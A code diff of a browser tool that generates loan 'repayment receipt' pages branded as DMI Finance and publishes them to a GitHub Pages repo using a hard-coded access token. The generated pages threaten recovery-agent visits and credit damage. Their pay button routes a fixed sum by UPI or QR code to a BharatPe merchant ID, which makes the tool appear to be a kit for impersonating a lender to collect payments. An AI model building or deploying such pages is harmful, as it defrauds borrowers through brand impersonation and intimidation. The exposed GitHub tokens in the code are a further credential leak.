@@ -210,7 +210,7 @@
     const REPO_NAME = 'dmifinance';
     const TARGET_FOLDER = 'loan';
     const LIVE_SITE_BASE = `https://${REPO_OWNER}.github.io/${REPO_NAME}/`;
-    const GITHUB_TOKEN = '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';
+    const GITHUB_TOKEN = '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';
 
     // Fixed Receipt & Payment Constants
     const MERCHANT_UPI_ID = 'BHARATPE09917548991@yesbankltd';
@@ -601,4 +601,937 @@
 
     @keyframes proceedRippleLoop {
       0% {
-        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15), 0 0 0 0 
+        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15), 0 0 0 0 rgba(255, 255, 255, 0.5);
+      }
+      70%, 100% {
+        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15), 0 0 0 10px rgba(255, 255, 255, 0);
+      }
+    }
+
+    @keyframes proceedShineLoop {
+      0% { left: -120%; }
+      55%, 100% { left: 145%; }
+    }
+
+    .pay-btn:active {
+      transform: scale(0.98);
+      background-color: #1143B5;
+      animation: none;
+    }
+
+    .disclaimer-card {
+      background-color: #FFFFFF;
+      border-radius: 16px;
+      padding: 16px 16px 14px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+    }
+
+    .disclaimer-text {
+      font-size: 11.5px;
+      line-height: 1.42;
+      color: #1F2937;
+      text-align: justify;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .disclaimer-text strong {
+      font-weight: 700;
+      color: #000000;
+    }
+
+    .footer-logos {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-top: 4px;
+      gap: 8px;
+    }
+
+    .mini-dmi {
+      display: flex;
+      align-items: center;
+      flex-shrink: 0;
+    }
+
+    .footer-brand-logo {
+      height: 20px;
+      width: auto;
+      max-width: 115px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .payment-partners {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .bharatpe-text {
+      font-size: 10.5px;
+      font-weight: 700;
+      color: #1E293B;
+      display: flex;
+      align-items: center;
+      gap: 2px;
+    }
+
+    .bharatpe-text span {
+      color: #00B9F1;
+    }
+
+    .rupay-text {
+      font-size: 11.5px;
+      font-weight: 700;
+      font-style: italic;
+      color: #1D3B8B;
+      letter-spacing: -0.3px;
+    }
+
+    .rupay-arrow {
+      color: #F37021;
+    }
+
+    .visa-text {
+      font-size: 12.5px;
+      font-weight: 700;
+      font-style: italic;
+      color: #1A1F71;
+      letter-spacing: -0.5px;
+    }
+
+    .mc-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .mc-circles {
+      display: flex;
+      align-items: center;
+    }
+
+    .mc-red {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #EB001B;
+    }
+
+    .mc-orange {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #F79E1B;
+      margin-left: -5px;
+      opacity: 0.9;
+    }
+
+    .mc-label {
+      font-size: 5px;
+      font-weight: 700;
+      color: #374151;
+      margin-top: 1px;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(15, 23, 42, 0.65);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 1000;
+      backdrop-filter: blur(2px);
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.92); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .qr-modal-box {
+      background-color: #FFFFFF;
+      width: 100%;
+      max-width: 390px;
+      border-radius: 16px;
+      padding: 24px 22px 20px;
+      text-align: center;
+      box-shadow: 0 22px 44px rgba(0, 0, 0, 0.28);
+      animation: popIn 0.2s ease-out;
+    }
+
+    .qr-top-meta {
+      background-color: #F8FAFC;
+      border: 1px solid #E2E8F0;
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    .qr-customer-name {
+      font-size: 16px;
+      font-weight: 700;
+      color: #0F172A;
+      letter-spacing: 0.3px;
+      line-height: 1.25;
+      text-transform: uppercase;
+    }
+
+    .qr-loan-id {
+      font-size: 12.5px;
+      font-weight: 600;
+      color: #475569;
+      margin-top: 3px;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+    }
+
+    .qr-code-frame {
+      width: 212px;
+      height: 212px;
+      margin: 0 auto 16px;
+      padding: 10px;
+      background-color: #FFFFFF;
+      border: 2px solid #E2E8F0;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .qr-code-frame svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    .qr-amount-bold {
+      font-size: 28px;
+      font-weight: 700;
+      color: #0F172A;
+      line-height: 1.15;
+      letter-spacing: 0.3px;
+    }
+
+    .qr-manager-caption {
+      font-size: 13px;
+      font-weight: 600;
+      color: #334155;
+      margin-top: 6px;
+      margin-bottom: 18px;
+      line-height: 1.35;
+    }
+
+    .qr-actions-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .qr-btn-close {
+      width: 100%;
+      background-color: #1754D8;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 12px;
+      padding: 11px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="mobile-container">
+    <header class="top-header">
+      <div class="logo-box">
+        <img
+          src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
+          alt="DMI Finance"
+          class="top-brand-logo"
+          onerror="this.onerror=null; this.src='https://placehold.co/210x52/ffffff/0B3B9C?text=DMI+FINANCE';"
+        />
+      </div>
+    </header>
+
+    <main class="receipt-card">
+      <h1 class="receipt-title">REPAYMENT RECEIPT</h1>
+      <div class="detail-list">
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img src="${ICON_BASE_URL}holder.png" alt="Account Holder" class="receipt-icon-img" data-fallback="user" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">ACCOUNT HOLDER</span>
+            <span class="detail-value" id="holder-name">${safeName}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img src="${ICON_BASE_URL}loan.png" alt="Loan ID" class="receipt-icon-img" data-fallback="loan" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">LOAN ID</span>
+            <span class="detail-value" id="loan-id">${safeLoan}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img src="${ICON_BASE_URL}status.png" alt="Bill Status" class="receipt-icon-img" data-fallback="status" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL STATUS</span>
+            <span class="detail-value" id="bill-status">${safeStatus}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img src="${ICON_BASE_URL}date.png" alt="Bill Date" class="receipt-icon-img" data-fallback="date" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL DATE</span>
+            <span class="detail-value" id="bill-date">${safeDate}</span>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img src="${ICON_BASE_URL}amount.png" alt="Bill Amount" class="receipt-icon-img" data-fallback="amount" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">BILL AMOUNT</span>
+            <span class="detail-value" id="bill-amount">${safeDisplayAmount}</span>
+            <div class="green-underline"></div>
+          </div>
+        </div>
+
+        <div class="detail-item">
+          <div class="icon-wrap">
+            <img src="${ICON_BASE_URL}manager.png" alt="Collection Manager" class="receipt-icon-img" data-fallback="manager" />
+          </div>
+          <div class="detail-content">
+            <span class="detail-label">COLLECTION MANAGER</span>
+            <span class="detail-value" id="manager-name">${COLLECTION_MANAGER_NAME}</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="contact-section">
+        <p class="contact-heading">For any queries, please contact <strong>DMI Finance</strong></p>
+        <div class="contact-row">
+          <a href="tel:${CUSTOMER_PHONE_TEL}" class="contact-link">
+            <img src="${ICON_BASE_URL}chat.png" alt="Contact" class="contact-icon-img" onerror="this.style.display='none'" />
+            ${CUSTOMER_PHONE_DISPLAY}
+          </a>
+          <a href="mailto:${CUSTOMER_EMAIL}" class="contact-link">
+            <img src="${ICON_BASE_URL}mail.png" alt="Email" class="contact-icon-img" onerror="this.style.display='none'" />
+            ${CUSTOMER_EMAIL}
+          </a>
+        </div>
+      </div>
+    </main>
+
+    <button type="button" class="pay-btn" id="proceedPayBtn" onclick="openPaymentModal()">
+      PROCEED TO PAY
+    </button>
+
+    <footer class="disclaimer-card">
+      <p class="disclaimer-text">
+        <strong>DMI Finance</strong> loan account has been classified as a written-off case. Any payment you make will be reflected in your loan account within two to four weeks. To avoid a visit from recovery agents and a negative impact on your CIBIL score, please pay the full outstanding amount or close your loan at the earliest. For the exact outstanding amount and payment options, please contact DMI Finance through its official customer care channels.
+      </p>
+
+      <div class="footer-logos">
+        <div class="mini-dmi">
+          <img
+            src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
+            alt="DMI Finance"
+            class="footer-brand-logo"
+            onerror="this.onerror=null; this.src='https://placehold.co/110x26/ffffff/0B3B9C?text=DMI+FINANCE';"
+          />
+        </div>
+
+        <div class="payment-partners">
+          <div class="bharatpe-text">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="10" stroke="#00B9F1" stroke-width="2.5"/>
+              <path d="M8 10h8M8 14h6" stroke="#1E293B" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            Bharat<span>Pe</span>
+          </div>
+          <div class="rupay-text">RuPay<span class="rupay-arrow">&#9656;</span></div>
+          <div class="visa-text">VISA</div>
+          <div class="mc-wrap">
+            <div class="mc-circles">
+              <div class="mc-red"></div>
+              <div class="mc-orange"></div>
+            </div>
+            <span class="mc-label">mastercard</span>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <div class="modal-overlay" id="paymentModal" onclick="closePaymentModal(event)">
+    <div class="qr-modal-box" id="pcQrModalBox" onclick="event.stopPropagation()">
+      <div class="qr-top-meta">
+        <div class="qr-customer-name" id="qrCustomerName">${safeName}</div>
+        <div class="qr-loan-id" id="qrLoanId">LOAN ID: ${safeLoan}</div>
+      </div>
+      <div class="qr-code-frame" id="qrCodeContainer" aria-label="UPI QR Code"></div>
+      <div class="qr-amount-bold" id="qrAmountDisplay">${safeDisplayAmount}</div>
+      <div class="qr-manager-caption">Collection Manager Md Adnan From DMI Finance</div>
+      <div class="qr-actions-row">
+        <button type="button" class="qr-btn-close" onclick="closePaymentModal()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const FIXED_UPI_AMOUNT = "${safeNumericAmount}";
+    const MERCHANT_UPI_ID = "${MERCHANT_UPI_ID}";
+    const MERCHANT_PAYEE_NAME = "${MERCHANT_PAYEE_NAME}";
+    const MERCHANT_TRANSACTION_NOTE = "${MERCHANT_TRANSACTION_NOTE}";
+
+    const FALLBACK_SVGS = {
+      user: '<svg width="24" height="24" viewBox="0 0 24 24" fill="#000000"><path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v2h20v-2c0-3.33-6.67-5-10-5z"/></svg>',
+      loan: '<svg width="24" height="24" viewBox="0 0 24 24" fill="#000000"><rect x="4" y="3" width="16" height="18" rx="4" fill="#000000"/><rect x="8" y="11" width="8" height="2.2" rx="1" fill="#FFFFFF"/></svg>',
+      status: '<svg width="24" height="24" viewBox="0 0 24 24" fill="#000000"><path d="M4 3v18l3-2 3 2 2-2 2 2 3-2 3 2V3l-3 2-3-2-2 2-2-2-3 2-3-2zm4 5h8v2H8V8zm0 4h8v2H8v-2zm0 4h5v2H8v-2z"/></svg>',
+      date: '<svg width="24" height="24" viewBox="0 0 24 24" fill="#000000"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11z"/><path d="M12.5 11.5h-2v1.5h1v3.5h-1v1.5h3.5v-1.5h-1v-5z"/></svg>',
+      amount: '<svg width="25" height="25" viewBox="0 0 24 24" fill="#000000"><circle cx="12" cy="12" r="10" fill="#000000"/><path d="M9 7h6v1.5h-2.2c.4.4.7.9.8 1.5H15v1.5h-1.4c-.2 1.4-1.3 2.4-2.8 2.5l3.2 3.5h-2.1l-3-3.4V12.5h1.5c.9 0 1.6-.4 1.8-1H9V10h3.1c-.2-.6-.9-1-1.8-1H9V7z" fill="#FFFFFF"/></svg>',
+      manager: '<svg width="24" height="24" viewBox="0 0 24 24" fill="#000000"><rect x="3" y="3" width="18" height="18" rx="5" fill="#000000"/><path d="M9.5 15.5L6.5 12.5l1.4-1.4 1.6 1.6 4.6-4.6 1.4 1.4-6 6z" fill="#FFFFFF"/></svg>'
+    };
+
+    function applyIconFallbacks() {
+      document.querySelectorAll('.receipt-icon-img').forEach((imgEl) => {
+        const key = imgEl.getAttribute('data-fallback');
+        imgEl.onerror = () => {
+          const parent = imgEl.parentElement;
+          if (parent && key && FALLBACK_SVGS[key]) {
+            parent.innerHTML = FALLBACK_SVGS[key];
+          }
+        };
+      });
+    }
+
+    function isMobileDevice() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera || '';
+      const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+      const coarsePointer = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;
+      const narrowViewport = window.innerWidth <= 768;
+      return mobileRegex.test(ua) || (coarsePointer && narrowViewport);
+    }
+
+    function buildUpiIntentUri() {
+      return (
+        'upi://pay?pa=' +
+        encodeURIComponent(MERCHANT_UPI_ID) +
+        '&pn=' +
+        encodeURIComponent(MERCHANT_PAYEE_NAME) +
+        '&am=' +
+        encodeURIComponent(FIXED_UPI_AMOUNT) +
+        '&cu=INR&tn=' +
+        encodeURIComponent(MERCHANT_TRANSACTION_NOTE)
+      );
+    }
+
+    const QR_GF_EXP = new Uint8Array(512);
+    const QR_GF_LOG = new Uint8Array(256);
+    (() => {
+      let x = 1;
+      for (let i = 0; i < 255; i++) {
+        QR_GF_EXP[i] = x;
+        QR_GF_LOG[x] = i;
+        x <<= 1;
+        if (x & 0x100) x ^= 0x11d;
+      }
+      for (let i = 255; i < 512; i++) {
+        QR_GF_EXP[i] = QR_GF_EXP[i - 255];
+      }
+    })();
+
+    function qrGfMul(a, b) {
+      if (a === 0 || b === 0) return 0;
+      return QR_GF_EXP[(QR_GF_LOG[a] + QR_GF_LOG[b]) % 255];
+    }
+
+    function qrPolyMul(p, q) {
+      const res = new Uint8Array(p.length + q.length - 1);
+      for (let i = 0; i < p.length; i++) {
+        for (let j = 0; j < q.length; j++) {
+          res[i + j] ^= qrGfMul(p[i], q[j]);
+        }
+      }
+      return res;
+    }
+
+    function qrGeneratorPoly(ecLen) {
+      let poly = new Uint8Array([1]);
+      for (let i = 0; i < ecLen; i++) {
+        poly = qrPolyMul(poly, new Uint8Array([1, QR_GF_EXP[i]]));
+      }
+      return poly;
+    }
+
+    function qrCalcEc(data, ecLen) {
+      const gen = qrGeneratorPoly(ecLen);
+      const buf = new Uint8Array(data.length + ecLen);
+      buf.set(data);
+      for (let i = 0; i < data.length; i++) {
+        const factor = buf[i];
+        if (factor !== 0) {
+          for (let j = 0; j < gen.length; j++) {
+            buf[i + j] ^= qrGfMul(gen[j], factor);
+          }
+        }
+      }
+      return buf.slice(data.length);
+    }
+
+    function generateQrCodeSvg(text) {
+      const encoder = new TextEncoder();
+      const rawBytes = encoder.encode(String(text || ''));
+      const versions = [
+        [1, 21, 16, 10, 1],
+        [2, 25, 28, 16, 1],
+        [3, 29, 44, 26, 1],
+        [4, 33, 64, 18, 2],
+        [5, 37, 86, 24, 2],
+        [6, 41, 108, 16, 4],
+        [7, 45, 124, 18, 4],
+        [8, 49, 154, 22, 4],
+        [9, 53, 182, 22, 5],
+        [10, 57, 216, 26, 5]
+      ];
+
+      let chosen = versions[versions.length - 1];
+      for (const v of versions) {
+        const capacityBytes = v[2] - (v[0] < 10 ? 2 : 3);
+        if (rawBytes.length <= capacityBytes) {
+          chosen = v;
+          break;
+        }
+      }
+
+      const [ver, size, totalDataCw, ecCwPerBlock, numBlocks] = chosen;
+      const bits = [];
+      const pushBits = (val, len) => {
+        for (let i = len - 1; i >= 0; i--) {
+          bits.push((val >> i) & 1);
+        }
+      };
+
+      pushBits(0b0100, 4);
+      pushBits(rawBytes.length, ver < 10 ? 8 : 16);
+      for (const b of rawBytes) pushBits(b, 8);
+
+      const maxDataBits = totalDataCw * 8;
+      const terminatorLen = Math.min(4, maxDataBits - bits.length);
+      if (terminatorLen > 0) pushBits(0, terminatorLen);
+      while (bits.length % 8 !== 0) bits.push(0);
+
+      const dataCodewords = new Uint8Array(totalDataCw);
+      let cwIdx = 0;
+      for (let i = 0; i < bits.length && cwIdx < totalDataCw; i += 8) {
+        let byteVal = 0;
+        for (let b = 0; b < 8; b++) {
+          byteVal = (byteVal << 1) | (bits[i + b] || 0);
+        }
+        dataCodewords[cwIdx++] = byteVal;
+      }
+
+      const padBytes = [0xec, 0x11];
+      let padIdx = 0;
+      while (cwIdx < totalDataCw) {
+        dataCodewords[cwIdx++] = padBytes[padIdx % 2];
+        padIdx++;
+      }
+
+      const shortBlockLen = Math.floor(totalDataCw / numBlocks);
+      const longBlocksCount = totalDataCw % numBlocks;
+      const dataBlocks = [];
+      const ecBlocks = [];
+      let offset = 0;
+
+      for (let b = 0; b < numBlocks; b++) {
+        const len = shortBlockLen + (b >= numBlocks - longBlocksCount ? 1 : 0);
+        const block = dataCodewords.slice(offset, offset + len);
+        offset += len;
+        dataBlocks.push(block);
+        ecBlocks.push(qrCalcEc(block, ecCwPerBlock));
+      }
+
+      const interleaved = [];
+      const maxBlockLen = shortBlockLen + (longBlocksCount > 0 ? 1 : 0);
+      for (let i = 0; i < maxBlockLen; i++) {
+        for (let b = 0; b < numBlocks; b++) {
+          if (i < dataBlocks[b].length) interleaved.push(dataBlocks[b][i]);
+        }
+      }
+      for (let i = 0; i < ecCwPerBlock; i++) {
+        for (let b = 0; b < numBlocks; b++) {
+          interleaved.push(ecBlocks[b][i]);
+        }
+      }
+
+      const finalBits = [];
+      for (const cw of interleaved) {
+        for (let bit = 7; bit >= 0; bit--) {
+          finalBits.push((cw >> bit) & 1);
+        }
+      }
+
+      const matrix = Array.from({ length: size }, () => new Int8Array(size).fill(-1));
+      const reserved = Array.from({ length: size }, () => new Uint8Array(size).fill(0));
+
+      const setModule = (r, c, val, isReserved = true) => {
+        if (r >= 0 && r < size && c >= 0 && c < size) {
+          matrix[r][c] = val ? 1 : 0;
+          if (isReserved) reserved[r][c] = 1;
+        }
+      };
+
+      const drawFinder = (topR, leftC) => {
+        for (let r = -1; r <= 7; r++) {
+          for (let c = -1; c <= 7; c++) {
+            const rr = topR + r;
+            const cc = leftC + c;
+            if (rr < 0 || rr >= size || cc < 0 || cc >= size) continue;
+            const inBorder = r === 0 || r === 6 || c === 0 || c === 6;
+            const inCenter = r >= 2 && r <= 4 && c >= 2 && c <= 4;
+            const isDark = r >= 0 && r <= 6 && c >= 0 && c <= 6 && (inBorder || inCenter);
+            setModule(rr, cc, isDark ? 1 : 0, true);
+          }
+        }
+      };
+
+      drawFinder(0, 0);
+      drawFinder(0, size - 7);
+      drawFinder(size - 7, 0);
+
+      const alignCentersByVer = {
+        2: [6, 18],
+        3: [6, 22],
+        4: [6, 26],
+        5: [6, 30],
+        6: [6, 34],
+        7: [6, 22, 38],
+        8: [6, 24, 42],
+        9: [6, 26, 46],
+        10: [6, 28, 50]
+      };
+      const centers = alignCentersByVer[ver] || [];
+      for (const rCenter of centers) {
+        for (const cCenter of centers) {
+          if (reserved[rCenter][cCenter]) continue;
+          for (let dr = -2; dr <= 2; dr++) {
+            for (let dc = -2; dc <= 2; dc++) {
+              const dark = Math.abs(dr) === 2 || Math.abs(dc) === 2 || (dr === 0 && dc === 0);
+              setModule(rCenter + dr, cCenter + dc, dark ? 1 : 0, true);
+            }
+          }
+        }
+      }
+
+      for (let i = 8; i < size - 8; i++) {
+        const bitVal = i % 2 === 0 ? 1 : 0;
+        if (!reserved[6][i]) setModule(6, i, bitVal, true);
+        if (!reserved[i][6]) setModule(i, 6, bitVal, true);
+      }
+
+      setModule(size - 8, 8, 1, true);
+
+      for (let i = 0; i < 8; i++) {
+        if (i < size) {
+          reserved[8][i] = 1;
+          reserved[i][8] = 1;
+        }
+        if (size - 1 - i >= 0) {
+          reserved[8][size - 1 - i] = 1;
+          reserved[size - 1 - i][8] = 1;
+        }
+      }
+
+      let bitIdx = 0;
+      let upward = true;
+      for (let col = size - 1; col > 0; col -= 2) {
+        if (col === 6) col = 5;
+        for (let step = 0; step < size; step++) {
+          const r = upward ? size - 1 - step : step;
+          for (const c of [col, col - 1]) {
+            if (!reserved[r][c]) {
+              const val = bitIdx < finalBits.length ? finalBits[bitIdx++] : 0;
+              matrix[r][c] = val;
+            }
+          }
+        }
+        upward = !upward;
+      }
+
+      for (let r = 0; r < size; r++) {
+        for (let c = 0; c < size; c++) {
+          if (!reserved[r][c] && (r + c) % 2 === 0) {
+            matrix[r][c] ^= 1;
+          }
+        }
+      }
+
+      const formatBits = 0x5412;
+      const getFmtBit = (idx) => (formatBits >> (14 - idx)) & 1;
+
+      const darkCoordsA = [
+        [8, 0], [8, 1], [8, 2], [8, 3], [8, 4], [8, 5], [8, 7], [8, 8],
+        [7, 8], [5, 8], [4, 8], [3, 8], [2, 8], [1, 8], [0, 8]
+      ];
+      darkCoordsA.forEach(([r, c], idx) => {
+        matrix[r][c] = getFmtBit(idx);
+      });
+
+      const darkCoordsB = [
+        [size - 1, 8], [size - 2, 8], [size - 3, 8], [size - 4, 8],
+        [size - 5, 8], [size - 6, 8], [size - 7, 8],
+        [8, size - 8], [8, size - 7], [8, size - 6], [8, size - 5],
+        [8, size - 4], [8, size - 3], [8, size - 2], [8, size - 1]
+      ];
+      darkCoordsB.forEach(([r, c], idx) => {
+        matrix[r][c] = getFmtBit(idx);
+      });
+
+      const quietZone = 2;
+      const totalModules = size + quietZone * 2;
+      let rects = '';
+      for (let r = 0; r < size; r++) {
+        for (let c = 0; c < size; c++) {
+          if (matrix[r][c] === 1) {
+            rects += '<rect x="' + (c + quietZone) + '" y="' + (r + quietZone) + '" width="1" height="1"/>';
+          }
+        }
+      }
+
+      return (
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ' +
+        totalModules +
+        ' ' +
+        totalModules +
+        '" shape-rendering="crispEdges">' +
+        '<rect width="' +
+        totalModules +
+        '" height="' +
+        totalModules +
+        '" fill="#FFFFFF"/>' +
+        '<g fill="#0F172A">' +
+        rects +
+        '</g></svg>'
+      );
+    }
+
+    function openPaymentModal() {
+      const upiUri = buildUpiIntentUri();
+      const overlay = document.getElementById('paymentModal');
+
+      if (isMobileDevice()) {
+        if (overlay) overlay.classList.remove('active');
+        try {
+          window.location.href = upiUri;
+        } catch (err) {
+          // Ignore if blocked
+        }
+        return;
+      }
+
+      const qrContainer = document.getElementById('qrCodeContainer');
+      if (qrContainer) {
+        qrContainer.innerHTML = generateQrCodeSvg(upiUri);
+      }
+      if (overlay) overlay.classList.add('active');
+    }
+
+    function closePaymentModal(event) {
+      const overlay = document.getElementById('paymentModal');
+      if (!event || event.target === overlay) {
+        overlay.classList.remove('active');
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      applyIconFallbacks();
+    });
+  <\/script>
+</body>
+</html>`;
+    }
+
+    function encodeUtf8Base64(text) {
+      const bytes = new TextEncoder().encode(text);
+      let binary = '';
+      for (let i = 0; i < bytes.length; i++) {
+        binary += String.fromCharCode(bytes[i]);
+      }
+      return btoa(binary);
+    }
+
+    /**
+     * Create or update loan/<slug>.html in GitHub repository via Contents API
+     */
+    async function saveReceiptToRepo({ fileSlug, htmlContent, commitMessage }) {
+      const filePath = `${TARGET_FOLDER}/${fileSlug}.html`;
+      const endpoint = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`;
+      const headers = {
+        Authorization: `Bearer ${GITHUB_TOKEN}`,
+        Accept: 'application/vnd.github+json',
+        'Content-Type': 'application/json'
+      };
+
+      let existingSha = null;
+      const lookupRes = await fetch(endpoint, { method: 'GET', headers });
+      if (lookupRes.ok) {
+        const lookupJson = await lookupRes.json();
+        existingSha = lookupJson.sha || null;
+      } else if (lookupRes.status !== 404) {
+        const errJson = await lookupRes.json().catch(() => ({}));
+        throw new Error(`Lookup failed (${lookupRes.status}): ${errJson.message || 'Unknown GitHub error'}`);
+      }
+
+      const bodyPayload = {
+        message: commitMessage,
+        content: encodeUtf8Base64(htmlContent),
+        ...(existingSha ? { sha: existingSha } : {})
+      };
+
+      const putRes = await fetch(endpoint, {
+        method: 'PUT',
+        headers,
+        body: JSON.stringify(bodyPayload)
+      });
+
+      if (!putRes.ok) {
+        const errJson = await putRes.json().catch(() => ({}));
+        const docLink = errJson.documentation_url ? ` (${errJson.documentation_url})` : '';
+        throw new Error(`Save failed (${putRes.status}): ${errJson.message || 'Permission or API error'}${docLink}`);
+      }
+
+      return {
+        filePath,
+        publicUrl: `${LIVE_SITE_BASE}${filePath}`
+      };
+    }
+
+    function syncSlugPreview() {
+      const rawName = document.getElementById('holderName').value || 'Adnan Ibrahim';
+      const slug = extractFileSlug(rawName.toUpperCase());
+      const preview = document.getElementById('fileSlugPreview');
+      if (preview) {
+        preview.textContent = `${TARGET_FOLDER}/${slug}.html`;
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('holderName').addEventListener('input', syncSlugPreview);
+
+      document.getElementById('todayBtn').addEventListener('click', () => {
+        document.getElementById('billDate').value = formatTodayDate();
+        clearStatusMessage();
+      });
+
+      document.getElementById('copyBtn').addEventListener('click', () => {
+        const inputEl = document.getElementById('shareLinkInput');
+        if (!inputEl || !inputEl.value) return;
+        try {
+          inputEl.select();
+          inputEl.setSelectionRange(0, inputEl.value.length);
+          document.execCommand('copy');
+          setStatusMessage('Shareable receipt link copied.', 'success');
+        } catch (err) {
+          setStatusMessage('Copy failed; please copy the link manually.', 'error');
+        }
+      });
+
+      document.getElementById('receiptForm').addEventListener('submit', async (event) => {
+        event.preventDefault();
+        clearStatusMessage();
+
+        const rawHolder = document.getElementById('holderName').value.trim();
+        const rawLoan = document.getElementById('loanId').value.trim();
+        const rawStatus = document.getElementById('billStatus').value.trim().toUpperCase();
+        const rawDate = document.getElementById('billDate').value.trim();
+        const rawAmount = document.getElementById('billAmount').value.trim();
+
+        if (!rawHolder) {
+          setStatusMessage('Please enter Account Holder Name.', 'error');
+          return;
+        }
+
+        const normalizedLoan = parseLoanId(rawLoan);
+        if (!normalizedLoan) {
+          setStatusMessage('Loan ID must start with DMI followed by 10 numeric digits.', 'error');
+          return;
+        }
+
+        if (!VALID_STATUSES.includes(rawStatus)) {
+          setStatusMessage('Please select a valid Bill Status.', 'error');
+          return;
+        }
+
+        const normalizedDate = parseBillDate(rawDate);
+        if (!normalizedDate) {
+          setStatusMessage('Invalid Bill Date. Use DD MMMM YYYY or leave blank for today.', 'error');
+          return;
+        }
+
+        const parsedAmt = parseAmount(rawAmount);
+        if (!parsedAmt) {
+          setStatusMessage('Please enter a valid positive Bill Amount.', 'error');
+          return;
+        }
+
+        const holderUpper = rawHolder.toUpperCase();
+        const fileSlug = extractFileSlug(holderUpper);
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Pushing to GitHub...';
+
+        try {
+          const htmlDoc = buildReceiptDocument({
+            holderName: holderUpper,
+            loanId: normalizedLoan,
+            billStatus: rawStatus,
+            billDate: normalizedDate,
+            displayAmount: parsedAmt.displayFormatted,
+            numericAmount: parsedAmt.numericFixed
+          });
+
+          const saved = await saveReceiptToRepo({
+            fileSlug,
+            htmlContent: htmlDoc,
+            commitMessage: `Create/update receipt for ${holderUpper} (${normalizedLoan})`
+          });
+
+          document.getElementById('resultCard').classList.remove('hidden');
+          document.getElementById('savedFileBadge').textContent = saved.filePath;
+          document.getElementById('shareLinkInput').value = saved.publicUrl;
+          document.getElementById('openPageBtn').href = saved.publicUrl;
+
+          setStatusMessage(`Saved ${saved.filePath} in ${REPO_OWNER}/${REPO_NAME}.`, 'success');
+        } catch (err) {
+          setStatusMessage(err.message || 'Failed to publish receipt to GitHub.', 'error');
+        } finally {
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Generate & Push to GitHub';
+        }
+      });
+    });
+  </script>
+</body>
+</html>
